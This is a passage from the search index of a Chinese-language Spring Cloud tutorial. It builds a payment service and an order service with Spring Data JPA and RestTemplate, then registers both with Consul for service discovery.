\u662f\u4e00\u4e2a\u5305\uff0c\u5b83\u5305\u542b\u4e86 Spring Cloud \u7684\u6240\u6709\u4f9d\u8d56\uff0c\u56e0\u6b64\u53ea\u8981\u58f0\u660e\u8fd9\u4e2a\u7684\u7248\u672c\uff0c\u540e\u7eed\u4f7f\u7528 Spring Cloud \u7684\u4efb\u4f55\u4f9d\u8d56\u90fd\u4f1a\u4f7f\u7528\u8fd9\u4e2a\u7248\u672c\u3002 \u7b2c\u4e00\u4e2a\u5b50\u9879\u76ee\u53ea\u662f\u5b58\u653e\u4e00\u4e9b\u516c\u7528\u7684\u7c7b\uff0c\u4f8b\u5982 record\uff0cwrapper\uff0cenum \u7b49\u7b49\uff0c\u4e0d\u5305\u542b\u4efb\u4f55\u4e1a\u52a1\u903b\u8f91\u3002\u76ee\u524d builder.gradle \u53ef\u4ee5\u7559\u7a7a\u3002 \u7b2c\u4e8c\u4e2a\u5b50\u9879\u76ee\u4e3a\u652f\u4ed8\u670d\u52a1\uff0c\u4f7f\u7528 Spring Data JPA \u64cd\u4f5c\u6570\u636e\u5e93\uff0cSpring Web \u63d0\u4f9b RESTful API\u3002 dependencies { implementation \"org.springdoc:springdoc-openapi-starter-webmvc-ui\" implementation \"org.springframework.boot:spring-boot-starter-web\" implementation \"org.postgresql:postgresql\" implementation \"org.springframework.boot:spring-boot-starter-data-jpa\" implementation project(\":commons\") } \u5fae\u670d\u52a1\u67b6\u6784\u4e2d\uff0c\u63d0\u4f9b\u670d\u52a1\u7684\u670d\u52a1\u79f0\u4e3a\u670d\u52a1\u63d0\u4f9b\u8005\uff0c\u8c03\u7528\u670d\u52a1\u7684\u670d\u52a1\u79f0\u4e3a\u670d\u52a1\u6d88\u8d39\u8005\u3002\u6211\u4eec\u8fd8\u8981\u5199\u4e00\u4e2a\u4e0b\u5355\u670d\u52a1\uff0c\u8fd9\u4e2a\u670d\u52a1\u4f1a\u8c03\u7528\u652f\u4ed8\u670d\u52a1\u3002 \u5b83\u7684\u914d\u7f6e\u5982\u4e0b\uff0c dependencies { implementation project(\":commons\") implementation \"org.springframework.boot:spring-boot-starter-web\" implementation \"org.springdoc:springdoc-openapi-starter-webmvc-ui\" } \u5728\u6839\u9879\u76ee settings.gradle \u4e0b\uff0c\u4f7f\u7528 rootProject.name = 'demo' include 'payment' include 'commons' include 'order' \u8fd9\u91cc include \u7684\u662f\u5b50\u9879\u76ee\u7684\u76ee\u5f55\u540d\uff0c\u800c\u4e0d\u662f\u9879\u76ee\u540d\u3002\u540e\u9762\u4f7f\u7528 project \u5f15\u5165\u5b50\u9879\u76ee\u65f6\uff0c\u4f7f\u7528\u7684\u662f\u9879\u76ee\u540d\u800c\u975e\u76ee\u5f55\u540d\u3002\u4e0d\u8fc7\u9ed8\u8ba4\u8fd9\u4e24\u4e2a\u662f\u76f8\u540c\u7684\u3002 \u5982\u679c\u8981\u6539\u9879\u76ee\u540d\uff0c\u9700\u8981\uff0c include \"foo\" rootProject.name = \"bar\" project(\":foo\").name = \"foofoo\" \u5982\u679c\u4f60\u4f7f\u7528 maven\uff0c\u8fd8\u8981\u5728\u5b50\u9879\u76ee\u4e2d\u6dfb\u52a0\u7236\u9879\u76ee\u4fe1\u606f\u3002 \u652f\u4ed8\u670d\u52a1\u4e1a\u52a1\u903b\u8f91 \u73b0\u5728\uff0c\u6682\u65f6\u5148\u4e0d\u8003\u8651\u5fae\u670d\u52a1\uff0c\u6211\u4eec\u5148\u57fa\u4e8e\u4e0a\u9762\u7684\u6570\u636e\u5e93\uff0c\u5199\u4e00\u70b9\u7b80\u5355\u7684\u4e1a\u52a1\u903b\u8f91\u3002\u8fd9\u91cc\u6211\u4eec\u4f7f\u7528 Spring Data JPA \u6765\u64cd\u4f5c\u6570\u636e\u5e93\u3002 \u6ce8\u610f\uff0c\u4e0b\u9762\u7684 record \u7c7b\uff0c\u679a\u4e3e\u7b49\u5e94\u5f53\u653e\u5728 commons \u9879\u76ee\u4e2d\uff0c\u5176\u5b83\u7684\u5e94\u5f53\u653e\u5728 payment \u9879\u76ee\u4e2d\u3002 package io.github.fingerbone.record; import java.math.BigDecimal; public record PaymentRecord( Long id, String paymentNo, String orderNo, Integer userId, BigDecimal amount, Boolean deleted ) { } package io.github.fingerbone.entity; import io.github.fingerbone.record.PaymentRecord; import jakarta.persistence.*; import org.springframework.beans.BeanUtils; import lombok.Data; import java.math.BigDecimal; import java.util.Date; @Entity @Data public final class Payment { @Id @GeneratedValue(strategy = GenerationType.IDENTITY) private Long id; @Column(name = \"payment_no\", nullable = false, length = 50) private String paymentNo; @Column(name = \"order_no\", nullable = false, length = 50) private String orderNo; @Column(name = \"user_id\", nullable = false) private Integer userId = 1; @Column(name = \"amount\", nullable = false, precision = 8, scale = 2) private BigDecimal amount = BigDecimal.valueOf(9.9); @Column(name = \"deleted\", nullable = false) private Boolean deleted = false; @Temporal(TemporalType.TIMESTAMP) @Column(name = \"create_time\", nullable = false, updatable = false) private Date createTime; @Temporal(TemporalType.TIMESTAMP) @Column(name = \"update_time\", nullable = false) private Date updateTime; @PrePersist private void onCreate() { createTime = new Date(); updateTime = new Date(); } @PreUpdate private void onUpdate() { updateTime = new Date(); } public PaymentRecord toRecord() { return new PaymentRecord( id, paymentNo, orderNo, userId, amount, deleted ); } public static Payment fromRecord(PaymentRecord record) { Payment payment = new Payment(); BeanUtils.copyProperties(record, payment); return payment; } } package io.github.fingerbone.repository; import io.github.fingerbone.entity.Payment; import org.springframework.data.jpa.repository.JpaRepository; import org.springframework.stereotype.Repository; @Repository public interface PaymentRepository extends JpaRepository<Payment, Long> { } package io.github.fingerbone.service; import io.github.fingerbone.entity.Payment; import io.github.fingerbone.repository.PaymentRepository; import org.springframework.beans.factory.annotation.Autowired; import org.springframework.stereotype.Service; import java.util.List; @Service public class PaymentService { private final PaymentRepository paymentRepository; public PaymentService( @Autowired PaymentRepository paymentRepository ) { this.paymentRepository = paymentRepository; } public Payment createPayment(Payment payment) { return paymentRepository.save(payment); } public Payment getPayment(Long id) { return paymentRepository.findById(id).orElse(null); } public void deletePayment(Long id) { Payment payment = paymentRepository.findById(id).orElse(null); if (payment != null) { payment.setDeleted(true); paymentRepository.save(payment); } } public Payment updatePayment(Payment payment) { return paymentRepository.save(payment); } public List<Payment> getAllPayments() { return paymentRepository.findAll(); } } package io.github.fingerbone.wrapper; public record ResponseWrapper<T>(Integer code, String message, Long time, T data) { public static <T> ResponseWrapper<T> success(T data) { return new ResponseWrapper<>(ResponseCode.SUCCESS.getCode(), ResponseCode.SUCCESS.getMessage(), System.currentTimeMillis(), data); } public static <Void> ResponseWrapper<Void> success() { return new ResponseWrapper<>(ResponseCode.SUCCESS.getCode(), ResponseCode.SUCCESS.getMessage(), System.currentTimeMillis(),null); } public static <T> ResponseWrapper<T> error(ResponseCode responseCode, T data) { return new ResponseWrapper<>(responseCode.getCode(), responseCode.getMessage(), System.currentTimeMillis(), data); } public static <Void> ResponseWrapper<Void> error(ResponseCode responseCode) { return new ResponseWrapper<>(responseCode.getCode(), responseCode.getMessage(), System.currentTimeMillis(), null); } public static <Void> ResponseWrapper<Void> error() { return new ResponseWrapper<>(ResponseCode.INTERNAL_SERVER_ERROR.getCode(), ResponseCode.INTERNAL_SERVER_ERROR.getMessage(), System.currentTimeMillis(), null); } } package io.github.fingerbone.wrapper; import lombok.AllArgsConstructor; import lombok.Data; import lombok.Getter; @AllArgsConstructor @Getter public enum ResponseCode { SUCCESS(200, \"Success\"), INTERNAL_SERVER_ERROR(500, \"Internal Server Error\"); private final Integer code; private final String message; } package io.github.fingerbone.wrapper; import org.springframework.web.bind.annotation.ControllerAdvice; import org.springframework.web.bind.annotation.ExceptionHandler; import org.springframework.web.bind.annotation.RestControllerAdvice; @RestControllerAdvice public class ExceptionWrapper { @ExceptionHandler(RuntimeException.class) public ResponseWrapper<String> handleException(RuntimeException e) { return ResponseWrapper.error(ResponseCode.INTERNAL_SERVER_ERROR, e.getMessage()); } } package io.github.fingerbone.controller; import io.github.fingerbone.entity.Payment; import io.github.fingerbone.record.PaymentRecord; import io.github.fingerbone.service.PaymentService; import io.github.fingerbone.wrapper.ResponseWrapper; import org.springframework.beans.factory.annotation.Autowired; import org.springframework.web.bind.annotation.GetMapping; import org.springframework.web.bind.annotation.PostMapping; import org.springframework.web.bind.annotation.RequestMapping; import org.springframework.web.bind.annotation.RestController; import org.springframework.web.bind.annotation.RequestBody; import org.springframework.web.bind.annotation.PathVariable; import org.springframework.web.bind.annotation.DeleteMapping; import org.springframework.web.bind.annotation.PutMapping; import java.util.stream.Collectors; import java.util.List; @RestController @RequestMapping(\"/payment\") public class PaymentController { private final PaymentService paymentService; public PaymentController( @Autowired PaymentService paymentService ) { this.paymentService = paymentService; } @PostMapping public ResponseWrapper<PaymentRecord> createPayment(@RequestBody PaymentRecord paymentRecord) { return ResponseWrapper.success( paymentService.createPayment(Payment.fromRecord(paymentRecord)).toRecord() ); } @GetMapping public ResponseWrapper<List<PaymentRecord>> getAllPayments() { return ResponseWrapper.success( paymentService.getAllPayments().stream().map(Payment::toRecord).collect(Collectors.toList()) ); } @GetMapping(\"/{id}\") public ResponseWrapper<PaymentRecord> getPayment(@PathVariable Long id) { return ResponseWrapper.success( paymentService.getPayment(id).toRecord() ); } @DeleteMapping(\"/{id}\") public ResponseWrapper<Void> deletePayment(@PathVariable Long id) { paymentService.deletePayment(id); return ResponseWrapper.success(); } @PutMapping(\"/{id}\") public ResponseWrapper<PaymentRecord> updatePayment(@PathVariable Long id, @RequestBody PaymentRecord paymentRecord) { Payment payment = Payment.fromRecord(paymentRecord); payment.setId(id); return ResponseWrapper.success( paymentService.updatePayment(payment).toRecord() ); } } \u8fd9\u4e9b\u90fd\u4e0d\u96be\uff0c\u90fd\u662f\u7b80\u5355\u7684\u589e\u5220\u6539\u67e5\u3002 \u4e0b\u5355\u670d\u52a1\u4e1a\u52a1\u903b\u8f91 \u5728 python \u4e2d\uff0c\u8c03\u7528\u53e6\u4e00\u4e2a http \u670d\u52a1\u5f88\u7b80\u5355\uff0c\u53ea\u9700\u8981\u4f7f\u7528 requests \u5373\u53ef\u3002\u4f46\u662f\u5728 java \u4e2d\uff0c\u6211\u4eec\u9700\u8981\u4f7f\u7528 RestTemplate \u6765\u8c03\u7528\u3002 package io.github.fingerbone; import org.springframework.context.annotation.Bean; import org.springframework.context.annotation.Configuration; import org.springframework.web.client.RestTemplate; @Configuration public class RestTemplateConfig { @Bean RestTemplate restTemplate() { return new RestTemplate(); } } package io.github.fingerbone; import io.github.fingerbone.record.PaymentRecord; import io.github.fingerbone.wrapper.ResponseWrapper; import org.springframework.beans.factory.annotation.Autowired; import org.springframework.http.HttpEntity; import org.springframework.http.ResponseEntity; import org.springframework.web.bind.annotation.*; import org.springframework.web.client.RestTemplate; import org.springframework.core.ParameterizedTypeReference; import org.springframework.http.HttpMethod; import java.util.List; @RestController @RequestMapping(\"/consumer/payment\") public class ConsumerPaymentController { private final RestTemplate restTemplate; private static final String paymentServiceUrl = \"http://localhost:8080\" + \"/payment\"; @Autowired public ConsumerPaymentController(RestTemplate restTemplate) { this.restTemplate = restTemplate; } @PostMapping public ResponseWrapper<PaymentRecord> createPayment(@RequestBody PaymentRecord paymentRecord) { HttpEntity<PaymentRecord> request = new HttpEntity<>(paymentRecord); ResponseEntity<ResponseWrapper<PaymentRecord>> response = restTemplate.exchange( paymentServiceUrl, HttpMethod.POST, request, new ParameterizedTypeReference<>() { } ); return response.getBody(); } @GetMapping public ResponseWrapper<List<PaymentRecord>> getAllPayments() { ResponseEntity<ResponseWrapper<List<PaymentRecord>>> response = restTemplate.exchange( paymentServiceUrl, HttpMethod.GET, null, new ParameterizedTypeReference<>() { } ); return response.getBody(); } @GetMapping(\"/{id}\") public ResponseWrapper<PaymentRecord> getPayment(@PathVariable Long id) { ResponseEntity<ResponseWrapper<PaymentRecord>> response = restTemplate.exchange( paymentServiceUrl + \"/\" + id, HttpMethod.GET, null, new ParameterizedTypeReference<>() { } ); return response.getBody(); } @DeleteMapping(\"/{id}\") public ResponseWrapper<Void> deletePayment(@PathVariable Long id) { restTemplate.delete(paymentServiceUrl + \"/\" + id); return ResponseWrapper.success(); } @PutMapping(\"/{id}\") public ResponseWrapper<PaymentRecord> updatePayment(@PathVariable Long id, @RequestBody PaymentRecord paymentRecord) { restTemplate.put(paymentServiceUrl + \"/\" + id, paymentRecord); return ResponseWrapper.success(); } } \u5f53\u7136\uff0c\u8bb0\u5f97\u8981\u6539\u7b2c\u4e8c\u4e2a\u9879\u76ee\u7684\u7aef\u53e3\uff0c\u5426\u5219\u4f1a\u51b2\u7a81\u3002 \u8fd9\u6837\uff0c\u6211\u4eec\u4fbf\u6709\u4e86\u5fae\u670d\u52a1\u7684\u96cf\u5f62\u3002\u4f46\u662f\uff0c\u73b0\u5728\u7684\u9879\u76ee\u672c\u8d28\u4e0a\u548c\u6211\u4eec\u4e4b\u524d python \u7684\u5c0f demo \u6ca1\u6709\u4ec0\u4e48\u533a\u522b\uff0c\u53ea\u662f\u591a\u4e86\u4e00\u4e9b java \u7279\u8272\u7684 boilerplate \u4ee3\u7801\u3002 \u670d\u52a1\u6ce8\u518c\u4e0e\u53d1\u73b0 \u73b0\u5728\uff0c\u6211\u4eec\u5f15\u5165\u670d\u52a1\u6ce8\u518c\u4e0e\u53d1\u73b0\u673a\u5236\u3002 \u4f46\u662f\u8bb2\u5b9e\u9645\u77e5\u8bc6\u4e4b\u524d\uff0c\u6211\u4eec\u5148\u8bb2 Spring Cloud \u7684\u6587\u6863\u600e\u4e48\u770b\uff0c\u6bd4\u5982\u8fd9\u91cc\u6211\u4eec\u60f3\u4f7f\u7528 Consul\u3002 \u5148\u4ece\u5de6\u4fa7\u9009\u62e9 Spring Cloud Consul\uff0c\u9009\u62e9 Learn\uff0c\u7136\u540e\u9009\u62e9 Reference Documentation\u3002\u4e4b\u540e\u4f60\u4f1a\u627e\u5230\u4f60\u9700\u8981\u7684\u4e00\u5207\u77e5\u8bc6\u3002 \u5728\u5de6\u4fa7\u5207\u6362\u5230\u670d\u52a1\u53d1\u73b0\uff0c\u8fd9\u4e0e\u6211\u4eec\u63a5\u4e0b\u6765\u8981\u4ecb\u7ecd\u7684\u5185\u5bb9\u5b8c\u5168\u4e00\u81f4\u3002\u4e0d\u8fc7\u6211\u4eec\u7684\u66f4\u7cbe\u7b80\u3002 \u4e0d\u8fc7\uff0c\u6709\u65f6\u5019 Spring \u7684\u6587\u6863\u5e76\u4e0d\u662f\u6700\u65b0\u7684\uff0c\u5982\u679c\u67d0\u4e9b\u4f9d\u8d56\u6709 GitHub \u4e3b\u9875\uff0c\u4e00\u822c\u80fd\u5728 GitHub \u4e0a\u627e\u5230\u6700\u65b0\u7684\u6587\u6863\u3002 \u9996\u5148\uff0c\u6211\u4eec\u9700\u8981\u5f15\u5165 Spring Cloud Consul \u7684\u4f9d\u8d56\u3002 dependencies { implementation \"org.springframework.cloud:spring-cloud-starter-consul-discovery\" } \u7136\u540e\u6539 application.yml\uff0c\u9ed8\u8ba4\u914d\u7f6e\u5982\u4e0b\uff0c spring: cloud: consul: host: localhost port: 8500 discovery: service-name: ${spring.application.name} \u53ef\u4ee5\u4e0d\u5199\uff0c\u56e0\u4e3a\u8fd9\u662f\u9ed8\u8ba4\u914d\u7f6e\u3002\u5982\u679c\u9700\u8981\u6539\u53d8\uff0c\u53ef\u4ee5\u5728\u8fd9\u91cc\u6539\u3002\u8fd9\u91cc\u914d\u7f6e\u4e86 consul \u7684\u5730\u5740\u3002\u6b64\u5916\u670d\u52a1\u540d\u4e5f\u53ef\u4ee5\u6539\u3002 \u7136\u540e\uff0c\u5728\u4e3b\u542f\u52a8\u7c7b\uff0c\u6dfb\u52a0 @EnableDiscoveryClient \u542f\u7528\u670d\u52a1\u53d1\u73b0\u3002Spring Boot \u5176\u5b9e\u662f\u4f1a\u81ea\u52a8\u7ed9\u4f60\u52a0\u4e0a\u7684\uff0c\u4f46\u662f\u4e3a\u4e86\u660e\u786e\uff0c\u6211\u4eec\u8fd8\u662f\u624b\u52a8\u5199\u4e0a\u3002 package io.github.fingerbone; import org.springframework.boot.SpringApplication; import org.springframework.boot.autoconfigure.SpringBootApplication; import org.springframework.cloud.client.discovery.EnableDiscoveryClient; @SpringBootApplication @EnableDiscoveryClient public class Main8081 { public static void main(String[] args) { SpringApplication.run(Main8081.class, args); } } \u6b64\u5916\uff0c\u7531\u4e8e Consul \u9700\u8981\u68c0\u67e5\u670d\u52a1\u7684\u53ef\u7528\u6027\uff0c\u56e0\u6b64\u9700\u8981\u5065\u5eb7\u68c0\u67e5\u548c\u5fc3\u8df3\u68c0\u67e5\u3002\u8fd9\u91cc\u6211\u4eec\u4f7f\u7528 actuator \u6765\u63d0\u4f9b\u8fd9\u4e9b\u4fe1\u606f\u3002 dependencies { implementation \"org.springframework.boot:spring-boot-starter-actuator\" } \u7136\u540e\uff0c\u6211\u4eec\u53ef\u4ee5\u5728 Consul \u7684\u754c\u9762\u4e0a\u770b\u5230\u6211\u4eec\u7684\u670d\u52a1\u3002 \u4f46\u662f\uff0c\u5982\u679c\u6211\u4eec\u4f7f\u7528\u57df\u540d\u6216 IP \u5730\u5740\u901a\u4fe1\uff0c\u662f\u4e0d\u4f1a\u7ecf\u8fc7 Consul \u7684\u3002\u8fd9\u6837\u4e5f\u505a\u4e0d\u4e86\u8d1f\u8f7d\u5747\u8861\uff0c\u7194\u65ad\u7b49\u7b49\u3002 Consul \u4f1a\u628a\u670d\u52a1\u540d\u6ce8\u518c\u5230 DNS \u670d\u52a1\u5668\u4e0a\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u670d\u52a1\u540d\u6765\u8bbf\u95ee\u670d\u52a1\u3002\u4f46\u662f\uff0c\u8fd9\u4e2a DNS \u670d\u52a1\u5668\u662f Consul \u81ea\u5df1\u7684\uff0c\u6211\u4eec\u9700\u8981\u4f7f\u7528 Consul \u7684 DNS \u670d\u52a1\u5668\u3002 \u5177\u4f53\u800c\u8a00\uff0c\u6211\u4eec\u9996\u5148\u8981\u628a RestTemplate \u914d\u7f6e\u6362\u6210\uff0c @Configuration public class RestTemplateConfig { @Bean @LoadBalanced RestTemplate restTemplate() { return new RestTemplate(); } } \u8fd9\u91cc\u7684 @LoadBalanced \u662f\u4f7f\u7528\u8d1f\u8f7d\u5747\u8861\u5668\u3002\u4f7f\u7528\u8d1f\u8f7d\u5747\u8861\u5668\u65f6\uff0c\u53d1\u9001\u7684\u8bf7\u6c42\u4f1a\u5148\u7ecf\u8fc7\u670d\u52a1\u6ce8\u518c\u4e2d\u5fc3\uff0c\u7136\u540e\u518d\u5206\u53d1\u7ed9\u5bf9\u5e94\u7684\u670d\u52a1\u3002 @LoadBalanced \u53ea\u662f\u4e00\u4e2a\u63a5\u53e3\uff0c\u7531\u4e8e\u6211\u4eec\u8fd8\u6ca1\u6709\u5f15\u5165\u8d1f\u8f7d\u5747\u8861\u5668\uff0c\u56e0\u6b64\u6b64\u65f6\u5e76\u6ca1\u8fdb\u884c\u8d1f\u8f7d\u5747\u8861\u3002\u8fd9\u91cc\u52a0\u4e0a\u8fd9\u4e2a\u7684\u76ee\u7684\u662f\u4e3a\u4e86\u4f7f\u7528\u670d\u52a1\u540d\u6765\u8bbf\u95ee\u670d\u52a1\u3002 \u7136\u540e\u628a\u7f51\u5740\u6539\u6210 Consul \u4e0a\u7684\u670d\u52a1\u540d\uff0c\u6211\u8fd9\u91cc\u662f private static final String paymentServiceUrl = \"http://payment-service\" + \"/payment\"; \u3002 \u8fd9\u6837\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u901a\u8fc7\u670d\u52a1\u540d\u6765\u8bbf\u95ee\u670d\u52a1\u4e86\u3002","title":"Consul \u4f5c\u4e3a\u670d\u52a1\u6ce8\u518c\u4e2d\u5fc3"},{"location":"03/#spring-cloud-ch3-consul","text":"\u7b2c\u4e09\u7ae0\u5f00\u59cb\uff0c\u6211\u4eec\u5f00\u59cb\u5b66\u4e60 Spring Cloud\uff0c\u56e0\u6b64\u6807\u9898\u4e5f\u6539\u6210\u4e86 Spring Cloud \u901f\u6210\u3002 \u672c\u7b14\u8bb0 Spring Cloud \u90e8\u5206\u53c2\u8003\u4e86\u5c1a\u7845\u8c37\u9633\u8001\u5e08\u7684 \u6559\u7a0b \u3002Spring Cloud \u5148\u8bb2 Consul\uff0cLoad Balancer\uff0cSpring Interface Client \u4e0e OpenFeign\uff0cResilience4j\uff0cMicroMeter\uff0cGateway\uff0cSeata\uff0cWebFlux\uff0cSpring Security\uff0cKeyCloak\uff0cRabbit MQ\uff0cGraphQL\uff0cgRPC \u7136\u540e\u662f k8s\u3002\u5c3d\u7ba1\u4e0a\u9762\u90e8\u5206\u6280\u672f\u4e25\u683c\u8bb2\u5e76\u4e0d\u5c5e\u4e8e\u5fae\u670d\u52a1\uff0c\u4f46\u5b83\u4eec\u5c5e\u4e8e Spring \u7684\u8fdb\u9636\u5185\u5bb9\uff0c\u8fd9\u91cc\u5c31\u4e00\u8d77\u8bb2\u4e86\u3002","title":"Spring Cloud \u901f\u6210 Ch3 Consul \u670d\u52a1\u6ce8\u518c\u4e0e\u53d1\u73b0"},{"location":"03/#_1","text":"\u5fae\u670d\u52a1\u67b6\u6784\u662f\u4e00\u79cd\u67b6\u6784\u98ce\u683c\uff0c\u5b83\u662f\u4e00\u79cd\u5c06\u5355\u4e00\u5e94\u7528\u7a0b\u5e8f\u5f00\u53d1\u4e3a\u4e00\u7ec4\u5c0f\u578b\u670d\u52a1\u7684\u65b9\u6cd5\uff0c\u6bcf\u4e2a\u670d\u52a1\u8fd0\u884c\u5728\u81ea\u5df1\u7684\u8fdb\u7a0b\u4e2d\uff0c\u670d\u52a1\u4e4b\u95f4\u901a\u8fc7 HTTP \u6216\u8005\u6d88\u606f\u961f\u5217\u901a\u4fe1\u3002\u6bcf\u4e2a\u670d\u52a1\u90fd\u6709\u81ea\u5df1\u7684\u6570\u636e\u5e93\uff0c\u72ec\u7acb\u90e8\u7f72\uff0c\u72ec\u7acb\u5347\u7ea7\u3002 \u4f8b\u5982\uff0c\u50cf\u662f\u6dd8\u5b9d\u8fd9\u6837\u7684\u8d2d\u7269\u7f51\u7ad9\uff0c\u53ef\u80fd\u6709\u5546\u54c1\u670d\u52a1\uff0c\u8ba2\u5355\u670d\u52a1\uff0c\u7528\u6237\u670d\u52a1\uff0c\u652f\u4ed8\u670d\u52a1\u7b49\u7b49\uff0c\u6bcf\u4e2a\u670d\u52a1\u90fd\u8dd1\u5728\u5355\u72ec\u7684\u670d\u52a1\u5668\u4e0a\uff0c\u8fd9\u6837\u53ef\u4ee5\u66f4\u597d\u5730\u5b9e\u73b0\u9ad8\u53ef\u7528\uff0c\u9ad8\u5e76\u53d1\uff0c\u9ad8\u6269\u5c55\u3002 \u5f53\u7136\uff0c\u4e0d\u7528\u6846\u67b6\u4e5f\u5b8c\u5168\u53ef\u4ee5\u505a\u5230\u5fae\u670d\u52a1\u2014\u2014\u6211\u73b0\u5728\u5c31\u7528 python \u5199\u4e00\u4e2a\u3002 from fastapi import FastAPI api = FastAPI() @api.get(\"/secret\") def get_secret(): return \"You found my secret!\" if __name__ == \"__main__\": import uvicorn uvicorn.run(api, host=\"0.0.0.0\", port=8000) from fastapi import FastAPI api = FastAPI() @api.get(\"/secret\") def get_secret(password: str): if password != \"123456\": return import requests return requests.get(\"http://localhost:8000/secret\").text if __name__ == \"__main__\": import uvicorn uvicorn.run(api, host=\"0.0.0.0\", port=8001) \u8fd9\u6837\u5c31\u5b9e\u73b0\u4e86\u4e00\u4e2a\u7b80\u5355\u7684\u5fae\u670d\u52a1\u67b6\u6784\uff0c\u4e00\u4e2a\u670d\u52a1\u63d0\u4f9b\u5bc6\u7801\u9a8c\u8bc1\uff0c\u53e6\u4e00\u4e2a\u670d\u52a1\u63d0\u4f9b\u79d8\u5bc6\u4fe1\u606f\u3002 \u5f53\u7136\uff0c\u4e8b\u60c5\u4e0d\u53ef\u80fd\u8fd9\u4e48\u7b80\u5355\uff0c\u5f53\u7cfb\u7edf\u5f00\u59cb scale \u4e4b\u540e\uff0c\u4f1a\u6709\u8fd9\u6837\u51e0\u4e2a\u95ee\u9898\uff1a \u670d\u52a1\u6ce8\u518c\u4e0e\u53d1\u73b0\uff1a\u4e0d\u53ef\u80fd\u5168\u90e8\u4f7f\u7528 ip \u5730\u5740\u6216\u8005\u57df\u540d\u6765\u8bbf\u95ee\u670d\u52a1\uff0c\u56e0\u4e3a\u670d\u52a1\u53ef\u80fd\u4f1a\u52a8\u6001\u53d8\u5316\uff0c\u9700\u8981\u670d\u52a1\u6ce8\u518c\u4e0e\u53d1\u73b0\u3002\u9700\u8981\u4e00\u4e2a\u5de5\u5177\u6765\u7edf\u4e00\u5904\u7406\u670d\u52a1\u8bf7\u6c42\u5e76\u5206\u53d1\u7ed9\u5bf9\u5e94\u7684\u670d\u52a1\u3002 \u670d\u52a1\u8c03\u7528\uff1a\u8c03\u7528\u5176\u5b83\u670d\u52a1\u7684\u65f6\u5019\uff0c\u4e0d\u53ef\u80fd\u603b\u662f\u4ece\u57fa\u7840\u7684 http \u8bf7\u6c42\u5f00\u59cb\uff0c\u9700\u8981\u4e00\u4e2a\u5de5\u5177\u6765\u7b80\u5316\u670d\u52a1\u8c03\u7528\u3002 \u8d1f\u8f7d\u5747\u8861\uff1a\u5982\u679c\u6211\u4eec\u5df2\u7ecf\u628a\u6bcf\u4e2a\u670d\u52a1\u90e8\u7f72\u5728\u591a\u4e2a\u670d\u52a1\u5668\u4e0a\uff0c\u90a3\u4e48\u5982\u679c\u6211\u4eec\u9700\u8981\u66f4\u5927\u7684 qps\uff0c\u4e00\u4e2a\u81ea\u7136\u7684\u60f3\u6cd5\u5c31\u662f\u90e8\u7f72\u66f4\u591a\u7684\u540c\u4e00\u4e2a\u670d\u52a1\u3002\u4f46\u662f\uff0c\u8fd9\u6837\u5c31\u4f1a\u521b\u5efa\u591a\u4e2a\u670d\u52a1\u4e8b\u4f8b\uff0c\u4f8b\u5982\u670d\u52a1 A1\uff0c\u670d\u52a1 A2 \u90fd\u63d0\u4f9b\u540c\u4e00\u4e2a\u670d\u52a1\uff0c\u4e3a\u4e86\u8fbe\u5230\u66f4\u5927\u7684 qps\uff0c\u6211\u4eec\u5e94\u5f53\u5c06\u6240\u6709\u7684\u8bf7\u6c42\u5747\u5300\u5206\u53d1\u7ed9 A1 \u548c A2\u3002\u8fd9\u5c31\u662f\u8d1f\u8f7d\u5747\u8861\u3002 \u670d\u52a1\u7194\u65ad\uff1a\u5982\u679c\u4e00\u4e2a\u670d\u52a1\u51fa\u73b0\u95ee\u9898\uff0c\u4f8b\u5982\u8d85\u65f6\uff0c\u90a3\u4e48\u6211\u4eec\u5e94\u5f53\u505c\u6b62\u5411\u8fd9\u4e2a\u670d\u52a1\u53d1\u9001\u8bf7\u6c42\uff0c\u800c\u4e0d\u662f\u4e00\u76f4\u7b49\u5f85\uff0c\u5e76\u8fdb\u884c\u964d\u7ea7\uff0c\u5373\u51cf\u5c11\u5f53\u524d\u652f\u6301\u7684\u529f\u80fd\uff0c\u4ee5\u907f\u514d\u96ea\u5d29\uff0c\u5373\u670d\u52a1\u96c6\u7fa4\u4e2d\u4e00\u4e2a\u670d\u52a1\u7684\u6545\u969c\uff0c\u7531\u4e8e\u6ca1\u6709\u505a\u597d\u670d\u52a1\u7194\u65ad\uff0c\u5bfc\u81f4\u4f9d\u8d56\u8fd9\u4e2a\u670d\u52a1\u7684\u5176\u5b83\u670d\u52a1\u4e5f\u51fa\u73b0\u6545\u969c\uff0c\u6700\u7ec8\u4e00\u5c42\u5c42\u5411\u4e0b\uff0c\u76f4\u5230\u6574\u4e2a\u7cfb\u7edf\u5d29\u6e83\u3002 \u670d\u52a1\u7f51\u5173\uff1a\u5982\u679c\u6211\u4eec\u6709\u591a\u4e2a\u670d\u52a1\uff0c\u90a3\u4e48\u6211\u4eec\u5e94\u5f53\u6709\u4e00\u4e2a\u7edf\u4e00\u7684\u5165\u53e3\uff0c\u8fd9\u4e2a\u5165\u53e3\u53ef\u4ee5\u505a\u4e00\u4e9b\u7edf\u4e00\u7684\u5904\u7406\uff0c\u4f8b\u5982\u9274\u6743\uff0c\u9650\u6d41\uff0c\u65e5\u5fd7\u7b49\u7b49\u3002 Spring Cloud \u5c31\u662f\u4e3a\u4e86\u89e3\u51b3\u8fd9\u4e9b\u95ee\u9898\u800c\u751f\u7684\u3002\u4e0d\u8fc7\uff0cSpring Cloud \u662f\u4e00\u5957\u53c8\u5927\u53c8\u590d\u6742\u7684\u6846\u67b6\uff0c\u73b0\u5728\u4e5f\u6709\u516c\u53f8\u5728\u501f\u52a9 k8s \u52a0\u4e0a\u5bb9\u5668\u6280\u672f\u5b9e\u73b0\u5fae\u670d\u52a1\u67b6\u6784\uff0c\u8fd9\u6837\u53ef\u4ee5\u4e0d\u4f9d\u8d56\u4e8e\u5177\u4f53\u7684\u8bed\u8a00\u548c\u6846\u67b6\uff0c\u800c\u662f\u53ef\u4ee5\u81ea\u7531\u9009\u62e9\u3002\u4e0d\u8fc7\uff0cSpring Cloud \u4f9d\u7136\u662f\u8f83\u4e3a\u6d41\u884c\u7684\u5fae\u670d\u52a1\u6846\u67b6\u4e4b\u4e00\u3002 \u4eca\u5929\u6211\u4eec\u5148\u4ecb\u7ecd\u670d\u52a1\u6ce8\u518c\u4e0e\u53d1\u73b0\u3002","title":"\u5fae\u670d\u52a1\u67b6\u6784"},{"location":"03/#docker","text":"\u4e0b\u6587\u5c06\u4f7f\u7528 docker \u90e8\u7f72 